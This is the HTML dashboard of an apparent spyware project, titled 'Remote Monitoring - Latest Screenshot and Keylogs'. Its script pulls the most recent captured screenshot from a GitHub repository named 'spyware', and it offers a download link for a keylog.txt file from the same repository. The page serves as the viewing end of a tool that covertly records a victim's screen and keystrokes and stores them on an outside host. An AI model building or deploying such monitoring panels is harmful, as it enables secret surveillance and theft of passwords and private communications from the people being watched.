<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Remote Monitoring - Latest Screenshot and Keylogs</title>
    <style>
        body {
            font-family: Arial, sans-serif;
        }
        img {
            width: 400px;
            height: auto;
            margin: 10px;
        }
    </style>
</head>
<body>
    <h1>Remote Monitoring - Latest Screenshot and Keylogs</h1>
    
    <h2>Latest Screenshot</h2>
    <div id="latestScreenshot">
        <!-- Latest screenshot will be displayed here -->
        <script>
            const repo = "https://api.github.com/repos/shrijaybaheti/spyware/contents/screenshots";
            fetch(repo)
                .then(response => response.json())
                .then(data => {
                    // Filter and sort the images to get the latest one
                    const imageFiles = data.filter(file => file.name.endsWith(".png"));
                    if (imageFiles.length > 0) {
                        const latestFile = imageFiles.sort((a, b) => new Date(b.commit.author.date) - new Date(a.commit.author.date))[0];
                        let img = document.createElement("img");
                        img.src = latestFile.download_url; // Use the download URL for the latest screenshot
                        document.getElementById("latestScreenshot").appendChild(img);
                    }
                })
                .catch(error => console.error('Error fetching latest screenshot:', error));
        </script>
    </div>

    <h2>Keylogs</h2>
    <!-- Keylog file link -->
    <a href="https://github.com/shrijaybaheti/spyware/raw/main/keylog.txt" download>Download Keylog</a>

</body>
</html>
